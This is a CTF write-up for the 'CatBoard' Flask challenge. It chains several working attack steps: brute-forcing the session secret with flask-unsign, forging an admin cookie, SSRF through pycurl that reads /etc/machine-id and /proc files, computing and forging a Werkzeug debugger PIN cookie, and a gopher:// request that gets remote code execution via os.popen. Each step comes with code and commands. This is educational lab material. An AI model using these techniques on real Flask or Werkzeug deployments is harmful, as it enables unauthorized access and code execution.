# CatBoard — CTF Web Challenge Writeup

## Challenge Overview

**Target:** `http://52.59.124.14:5004`  
**Flag format:** `ENO{...}`  
**Category:** Web — SSRF, Session Forgery, Werkzeug Debugger PIN Bypass

The challenge presents "CatBoard," a cat image gallery built with Flask. The source code (`app.py`) is provided but fully obfuscated — every Python keyword, identifier, and string literal has been replaced with variations of "meow" (`mew`, `meow`, `meoow`, `meeeow`, etc.).

---

## Step 1: Deobfuscating the Source Code

The obfuscated `app.py` replaces all tokens with meow variants, but the structure (indentation, parentheses, decorators, operators) is preserved. By analyzing the code structure rather than token names, I identified:

- **Flask app** wrapped in a custom subclass of Werkzeug's `DebuggedApplication` (with `evalex=True`, `pin_security=True`)
- **Secret key:** a random word ≥12 characters selected from the `RandomWords` library
- **Session cookie:** Flask signed cookie with an `is_admin` boolean
- **Routes:** `/` (gallery), `/fetch` (admin-only SSRF proxy), `/vote/<int:id>`, `/health`, `/about`
- **Custom middleware** that blocks direct access to `/console` and fakes `pinauth` responses

Key finding from the middleware (lines 33–69):

```
1. Blocks /console access from non-private IPs
2. Intercepts __debugger__?cmd=pinauth and always returns {"auth": false}
3. All other requests pass through to the real DebuggedApplication
```

---

## Step 2: Cracking the Flask Secret Key

The app generates its secret key with:
```python
secret_key = RandomWords().get_random_word(minLength=12)
```

The `RandomWords` library ships with a static JSON wordlist at `/usr/local/lib/python3.12/dist-packages/random_word/database/words.json`. I extracted all 84,104 words with length ≥ 12 and used `flask-unsign` to bruteforce:

```bash
flask-unsign --unsign --cookie "eyJpc19hZG1pbiI6ZmFsc2V9.aYeVwA.5H0-_sIm5Q-J32PcnMTwc6z0aLs" \
  --wordlist wordlist.txt --no-literal-eval
```

**Secret found after ~7,424 attempts: `brownistical`**

---

## Step 3: Forging an Admin Session Cookie

With the secret key, I forged an admin session:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "brownistical"
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
admin_cookie = serializer.dumps({"is_admin": True})
```

This granted access to the admin-only `/fetch` endpoint, which renders an "Image Management" panel with a URL input field backed by `pycurl`.

---

## Step 4: SSRF via the `/fetch` Endpoint

The admin `/fetch` endpoint accepts a `url` parameter and fetches it with `pycurl`, which supports `file://`, `gopher://`, `dict://`, and other protocols.

### Information Gathering

Using `file://` SSRF, I read critical system files:

| File | Value |
|------|-------|
| `/etc/machine-id` | `c8f5e9d2a1b3c4d5e6f7a8b9c0d1e2f3` |
| `/sys/class/net/eth0/address` | `66:73:24:27:39:33` |
| `/proc/self/environ` | `FLASK_APP=app.py`, `FLASK_DEBUG=1`, `HOME=/home/ctfplayer`, `WERKZEUG_RUN_MAIN=true` |
| `/proc/self/cgroup` | `0::/` |
| `/proc/self/mountinfo` | Docker container ID: `9ef8e4a5e852...` |
| `/proc/self/net/tcp` | Listening on `0.0.0.0:5000` (internal) |

### Key Discoveries

- **Internal port is 5000** (not 5004 — there's a reverse proxy)
- **`/flag.txt` and `/readflag`** exist at filesystem root but are permission-restricted
- The app runs as `ctfplayer` (uid 1000), so `file:///flag.txt` returns "Couldn't open file"
- **`/readflag`** is a SUID binary — I needed RCE to execute it

---

## Step 5: Accessing the Werkzeug Debugger Console

The Werkzeug debugger console at `/console` is blocked by the custom middleware for external requests. However, **SSRF from localhost bypasses the IP check** (the middleware only blocks non-private IPs):

```
POST /fetch  url=http://127.0.0.1:5000/console
→ 200 OK — Full Werkzeug console page!
```

From the console HTML, I extracted the **debugger SECRET**: `aBCCW9bJLfWo4mtzFwSn`

---

## Step 6: Calculating the Werkzeug Debugger PIN

The Werkzeug debugger PIN is derived from:

**Public bits:** `[username, modname, appname, flask_module_path]`  
**Private bits:** `[str(uuid.getnode()), get_machine_id()]`

Using the leaked system data:

| Parameter | Value |
|-----------|-------|
| `username` | `ctfplayer` (from `getpass.getuser()`, confirmed via `/etc/passwd` UID 1000) |
| `modname` | `flask.app` |
| `appname` | `Flask` (`type(app).__name__`) |
| `flask_path` | `/usr/local/lib/python3.11/site-packages/flask/app.py` |
| `uuid.getnode()` | `112644713822515` (from eth0 MAC `66:73:24:27:39:33`) |
| `get_machine_id()` | `b"c8f5e9d2a1b3c4d5e6f7a8b9c0d1e2f3"` (machine-id only; cgroup `0::/` adds nothing in this werkzeug version) |

The PIN computation follows werkzeug 3.1.5's algorithm:

```python
h = hashlib.sha1()
for bit in [username, modname, appname, flask_path, str(mac_int), machine_id]:
    if isinstance(bit, str): bit = bit.encode()
    h.update(bit)
h.update(b"cookiesalt")
cookie_name = f"__wzd{h.hexdigest()[:20]}"
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]
pin = f"{num[:3]}-{num[3:6]}-{num[6:]}"
```

**Computed PIN: `171-165-093`**

---

## Step 7: Bypassing the Middleware's PIN Auth Block

The middleware intercepts `pinauth` commands and always returns `{"auth": false}`, preventing normal PIN authentication. However, I could **forge the PIN cookie directly** without going through `pinauth`:

```python
# Cookie format: timestamp|hash_pin(pin)
pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
cookie_value = f"{int(time.time())}|{pin_hash}"
# → __wzd8fe6343c0faf4f031d62=1738959726|446325dec3ec
```

---

## Step 8: RCE via Gopher + Werkzeug Eval

The `__debugger__` eval endpoint requires:
1. A valid frame (`frm=0` — only exists after `/console` is visited)
2. The correct debugger SECRET
3. A valid PIN cookie (`check_pin_trust()` must return `True`)

Since pycurl supports `gopher://`, I could craft raw HTTP requests with arbitrary cookies:

```
1. Visit /console via SSRF (creates frame 0)
   POST /fetch  url=http://127.0.0.1:5000/console

2. Execute code via gopher:// with forged PIN cookie
   POST /fetch  url=gopher://127.0.0.1:5000/_GET%20/__debugger__?...
   (with Cookie header containing the forged PIN cookie)
```

The gopher payload constructs a raw HTTP GET request to `/__debugger__` with our forged cookie:

```
GET /__debugger__?__debugger__=yes&cmd=<PYTHON_CODE>&frm=0&s=<SECRET> HTTP/1.1
Host: 127.0.0.1:5000
Cookie: __wzd8fe6343c0faf4f031d62=1738959726|446325dec3ec
Connection: close
```

### Getting the Flag

```python
cmd = "__import__('os').popen('/readflag').read()"
```

This executes the SUID `/readflag` binary, which reads the permission-restricted `/flag.txt` and returns the flag.

---

## Attack Chain Summary

```
Obfuscated source → Decode routes & secret key generation
         ↓
RandomWords wordlist → flask-unsign bruteforce → Secret: "brownistical"
         ↓
Forge admin session cookie {is_admin: True}
         ↓
Access /fetch admin endpoint → SSRF via pycurl
         ↓
file:// reads → Leak machine-id, MAC, username, container ID
         ↓
SSRF to http://127.0.0.1:5000/console → Get debugger SECRET + create frame 0
         ↓
Compute Werkzeug PIN + forge PIN auth cookie
         ↓
gopher:// SSRF → Raw HTTP with PIN cookie → __debugger__ eval → /readflag → FLAG
```

---

## Tools Used

- `flask-unsign` — Flask session cookie cracking and forging
- `pycurl` (server-side) — SSRF with `file://` and `gopher://` protocol support
- Python `hashlib` — Werkzeug PIN computation
- Manual code analysis — Deobfuscating the meow-ified source code
